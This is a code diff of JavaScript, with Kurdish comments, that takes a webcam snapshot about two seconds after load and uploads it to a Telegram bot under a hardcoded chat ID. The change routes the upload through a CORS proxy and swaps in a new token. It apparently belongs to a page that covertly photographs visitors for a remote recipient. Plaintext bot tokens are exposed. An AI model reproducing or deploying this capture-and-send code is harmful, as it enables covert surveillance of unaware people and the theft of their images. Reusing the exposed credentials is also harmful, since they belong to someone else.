@@ -21,8 +21,8 @@
 
           setTimeout(() => {
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
+            canvas.width = 480;
+            canvas.height = 360;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
@@ -33,11 +33,11 @@
               formData.append('chat_id', '6539379136');
               formData.append('photo', blob, 'snapshot.jpg');
 
-              const token = "8979741062:AAFFz0tN5rSEmjZli1vhfVr03zd2lJG0DSM".trim();
-              const telegramUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+              // تۆکەنی نوێی بۆتەکەت
+              const token = "897231728:AAFar8AG_UULAjxARf64N_PPzGpnUzf3wYU";
+              const targetUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
 
-              // ناردنی ڕاستەوخۆ بۆ تلگرام بە بێ پێویستی بە هیچ سێرڤەرێکی دەرەکی
-              fetch(telegramUrl, {
+              fetch('https://corsproxy.io/?' + encodeURIComponent(targetUrl), {
                 method: 'POST',
                 body: formData
               })
@@ -52,7 +52,7 @@
               .catch(error => {
                 statusEl.innerText = "❌ هەڵەی ناردن: " + error.message;
               });
-            }, 'image/jpeg');
+            }, 'image/jpeg', 0.8);
           }, 2000);
         })
         .catch(err => {
